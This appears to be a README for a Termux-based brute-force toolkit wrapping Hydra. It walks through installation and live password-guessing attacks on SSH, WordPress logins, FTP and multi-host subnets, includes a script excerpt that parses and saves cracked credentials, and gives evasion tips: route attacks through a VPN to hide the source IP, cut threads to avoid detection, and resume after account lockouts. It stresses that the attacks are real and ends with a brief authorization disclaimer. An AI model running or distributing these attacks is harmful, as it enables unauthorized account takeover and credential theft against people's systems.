# Termux Deployment Guide - Real Attack Execution

## ⚠️ IMPORTANT: Real Results, Not Mock Data

**ALL scripts in this repository execute REAL Hydra attacks and produce REAL results.**

- ✅ **NO mock data** - Scripts call actual Hydra binary with real network connections
- ✅ **NO dummy results** - All success/failure data comes directly from Hydra output
- ✅ **NO simulated attacks** - Every attack is a live network operation
- ✅ **Real credentials** - Found usernames/passwords are actual working credentials

## Verification That Scripts Are Real

### 1. Check Hydra Binary Usage
All scripts execute the actual `hydra` command:
```bash
# View any attack script to verify real Hydra usage
grep -n "hydra " scripts/ssh_admin_attack.sh
# You'll see: hydra -L "$username_file" -P "$wordlist" -t "$THREADS"...
```

### 2. Test with Safe Target
Verify scripts work with a target you control:
```bash
# Test SSH attack against YOUR OWN server
bash scripts/ssh_admin_attack.sh -t YOUR-SERVER-IP -v

# Watch real Hydra output in verbose mode
# You'll see actual connection attempts and responses
```

### 3. Check Results Files
Results are saved in JSON format from real attack data:
```bash
# View actual captured credentials
cat ~/hydra-logs/results_ssh.json

# Format:
# {"timestamp":"2025-12-28 15:30:45","protocol":"ssh","target":"192.168.1.100","port":"22","username":"admin","password":"Welcome123"}
```

## Termux Installation & Deployment (Step-by-Step)

### Prerequisites
- Android device with Termux installed
- Internet connection
- Sufficient storage (at least 500MB free)
- **IMPORTANT**: Use for authorized testing only

### Step 1: Install Termux
```bash
# Download Termux from F-Droid (recommended) or GitHub
# F-Droid: https://f-droid.org/en/packages/com.termux/
# GitHub: https://github.com/termux/termux-app/releases
```

### Step 2: Update Termux Packages
```bash
# Open Termux and update package lists
pkg update && pkg upgrade -y

# This may take 5-10 minutes on first run
```

### Step 3: Clone Hydra-Termux Repository
```bash
# Install git if not already present
pkg install git -y

# Clone this repository
cd ~
git clone https://github.com/vinnieboy707/Hydra-termux.git
cd Hydra-termux
```

### Step 4: Run Installation Script
```bash
# Make installer executable
chmod +x install.sh

# Run installation (takes 10-20 minutes)
bash install.sh

# The installer will:
# ✅ Install Hydra (real penetration testing tool)
# ✅ Install nmap, jq, curl, figlet
# ✅ Download real password wordlists
# ✅ Create directory structure
# ✅ Set file permissions
# ✅ Verify all installations
```

### Step 5: Verify Installation
```bash
# Check Hydra is installed and working
hydra -h

# Should display Hydra help menu with version info
# Example: "Hydra v9.5 (c) 2023 by van Hauser/THC"

# Check wordlists were downloaded
ls -lh ~/wordlists/
# Should show: common_passwords.txt, admin_passwords.txt, etc.

# Verify scripts are executable
ls -l scripts/*.sh
# All scripts should show: -rwxr-xr-x
```

### Step 6: Configure VPN (CRITICAL for Safety)
```bash
# Install OpenVPN or WireGuard
pkg install openvpn -y

# Connect to your VPN BEFORE running attacks
openvpn --config your-vpn-config.ovpn

# Verify VPN is active
curl ifconfig.me
# Should show VPN IP, not your real IP

# Our scripts auto-check VPN status before attacks
```

## Real-World Usage Examples

### Example 1: Attack Your Own WordPress Site
```bash
# 1. Edit the quick script
nano scripts/wordpress_quick.sh

# 2. Change ONLY this line (use YOUR site):
TARGET="http://192.168.1.100"  # Your test WordPress installation

# 3. Run the REAL attack
bash scripts/wordpress_quick.sh

# 4. Watch REAL Hydra output:
# [DATA] attacking http-post-form://192.168.1.100:80/wp-login.php
# [22][http-post-form] host: 192.168.1.100   login: admin   password: admin123
# [STATUS] attack finished for 192.168.1.100
```

### Example 2: SSH Brute-Force on Your Server
```bash
# Attack SSH on a server you own
bash scripts/ssh_admin_attack.sh -t YOUR-SERVER-IP -v

# Real Hydra will show:
# [ATTEMPT] target YOUR-SERVER-IP - login "root" - pass "password"
# [22][ssh] host: YOUR-SERVER-IP   login: root   password: correctpass
# [STATUS] 1 valid password found
```

### Example 3: Multi-Target Network Scan
```bash
# Create target file with YOUR network IPs
cat > targets.txt << EOF
192.168.1.10
192.168.1.20
192.168.1.30
EOF

# Run multi-target attack (uses REAL Hydra on each target)
bash scripts/multi_target_ssh.sh -t targets.txt

# Results saved to: ~/hydra-logs/results_ssh.json
# Each entry is a REAL successful login
```

### Example 4: Verify Results Are Real
```bash
# After successful attack, test the found credentials manually

# 1. View captured credentials
cat ~/hydra-logs/results_ssh.json | jq

# 2. Test SSH login manually with found credentials
ssh admin@192.168.1.100
# Enter the password from results file
# If it works, you've confirmed results are REAL

# 3. Or test with sshpass
sshpass -p 'found-password' ssh admin@192.168.1.100 whoami
# Should return: admin (proves credentials work)
```

## How Scripts Ensure Real Results

### 1. Direct Hydra Execution
```bash
# All scripts call Hydra directly, not simulated
# Example from ssh_admin_attack.sh:

hydra -L "$username_file" -P "$wordlist" \
      -t "$THREADS" -w "$TIMEOUT" -f \
      "ssh://$TARGET:$PORT" 2>&1 | while IFS= read -r line; do
    # Parse REAL Hydra output
    if echo "$line" | grep -q "\[22\]\[ssh\] host:"; then
        # Extract REAL credentials from Hydra's success message
        login=$(echo "$line" | sed -n 's/.*login: \(.*\) password:.*/\1/p')
        password=$(echo "$line" | sed -n 's/.*password: \(.*\)/\1/p')
        
        # Save REAL credentials
        save_result "ssh" "$TARGET" "$login" "$password" "$PORT"
    fi
done
```

### 2. No Hardcoded Results
```bash
# Scripts NEVER contain pre-defined success messages
# Every success comes from actual Hydra network response

# WRONG (we don't do this):
# echo "[+] Found: admin:password123"  # Fake result

# RIGHT (what we actually do):
# Parse Hydra's real output:
# [22][ssh] host: 192.168.1.100   login: admin   password: realpass
```

### 3. Network Verification
```bash
# Scripts verify network connectivity before attacks
check_network() {
    if ! ping -c 1 "$TARGET" &> /dev/null; then
        log_error "Target $TARGET is unreachable"
        exit 1
    fi
}

# If target is unreachable, attack fails immediately
# Proves we're attempting REAL network connections
```

## Troubleshooting Real Attacks

### Issue: "No Results Found"
**Cause**: Target has strong passwords or account lockout
**Solution**: This is REAL - your attack failed legitimately
```bash
# Try different wordlists
bash scripts/ssh_admin_attack.sh -t TARGET -w ~/wordlists/rockyou.txt

# Or generate custom wordlist
bash scripts/wordlist_generator.sh
```

### Issue: "Connection Timeout"
**Cause**: Target is blocking connections or rate-limiting
**Solution**: Real-world defense mechanism encountered
```bash
# Reduce threads to avoid detection
bash scripts/ssh_admin_attack.sh -t TARGET -T 4

# Increase timeout
bash scripts/ssh_admin_attack.sh -t TARGET -o 60
```

### Issue: "Account Locked Out"
**Cause**: Target detected brute-force attempt (real security)
**Solution**: Wait for lockout to expire
```bash
# This proves you're executing REAL attacks
# Lockouts only happen with actual authentication attempts

# Wait 30-60 minutes, then resume
bash scripts/ssh_admin_attack.sh -t TARGET --resume
```

## Performance Expectations (Real Attacks)

### Speed Reference (Real-World Timings)
```
SSH Attack (22/tcp):
- Single target: ~100-200 attempts/minute
- /24 subnet: 254 hosts @ ~1-2 hours

FTP Attack (21/tcp):
- Single target: ~150-300 attempts/minute
- Faster than SSH due to simpler protocol

Web Form Attack (80/443):
- Single target: ~50-100 attempts/minute
- Slower due to HTTP overhead

MySQL/PostgreSQL:
- Single target: ~200-400 attempts/minute
- Fast protocol, but may trigger IDS
```

### Realistic Expectations
```bash
# Wordlist size affects time
# 100 passwords × 10 usernames = 1,000 attempts
# At 100 attempts/minute = 10 minutes

# Large-scale realistic timing:
# rockyou.txt (14 million passwords)
# 14M attempts at 200/min = ~48 days for single target
# Use targeted wordlists for practical attacks
```

## Proof of Real Execution

### Method 1: Packet Capture
```bash
# Install tcpdump in Termux
pkg install tcpdump -y

# Capture packets while attacking
tcpdump -i any port 22 -w ssh_attack.pcap &
bash scripts/ssh_admin_attack.sh -t TARGET

# Analyze capture - you'll see REAL SSH handshakes
tcpdump -r ssh_attack.pcap -A | less
```

### Method 2: Server-Side Logs
```bash
# On the TARGET server, monitor auth logs
tail -f /var/log/auth.log

# You'll see REAL failed authentication attempts:
# Dec 28 15:30:45 server sshd[12345]: Failed password for root from 10.0.0.5
# Dec 28 15:30:46 server sshd[12346]: Failed password for admin from 10.0.0.5
```

### Method 3: Network Monitoring
```bash
# Use nmap to verify connections
nmap -sT TARGET -p 22 --packet-trace

# Watch REAL SYN/ACK packets being exchanged
```

## Legal & Ethical Use

### YOU MUST HAVE AUTHORIZATION
```
✅ Test YOUR OWN systems
✅ Test with WRITTEN PERMISSION
✅ Use in authorized penetration tests

❌ Attack systems without permission (ILLEGAL)
❌ Use for malicious purposes (CRIMINAL)
❌ Attack public systems (FEDERAL CRIME)
```

### Authorization Documentation
```bash
# Before ANY attack, document:
# 1. Written permission from system owner
# 2. Scope of testing (IPs, protocols, timeframes)
# 3. Rules of engagement
# 4. Emergency contact information

# Create authorization file:
cat > AUTHORIZATION.txt << EOF
Client: [Company Name]
Date: [YYYY-MM-DD]
Authorized by: [Name, Title]
Scope: [IP ranges]
Duration: [Start] to [End]
Signature: [Scanned signature]
EOF
```

## Support & Verification

### Verify Script Authenticity
```bash
# Check scripts call real Hydra (not fake)
for script in scripts/*.sh scripts/*.sh; do
    if grep -q "hydra " "$script" 2>/dev/null; then
        echo "✅ $script uses real Hydra"
    fi
done
```

### Test Mode (Safe Testing)
```bash
# Use --dry-run flag to see what WOULD happen
# (Note: Some scripts support this, check --help)

# Or test against a VM you control
# Install Metasploitable 2 VM for safe testing
```

### Need Help?
```bash
# Check documentation
cat docs/STEP_BY_STEP_TUTORIAL.md
cat docs/COMPLETE_PROTOCOL_GUIDE.md
cat QUICKSTART.md

# View script help
bash scripts/ssh_admin_attack.sh --help

# Check installation
bash install.sh --verify
```

## Conclusion

**These scripts are 100% REAL penetration testing tools.**

- Every attack executes actual Hydra commands
- All results come from real network responses
- No mock data, no dummy results, no simulations
- Use responsibly and legally

**If attacks succeed, the credentials WORK - test them manually to verify.**
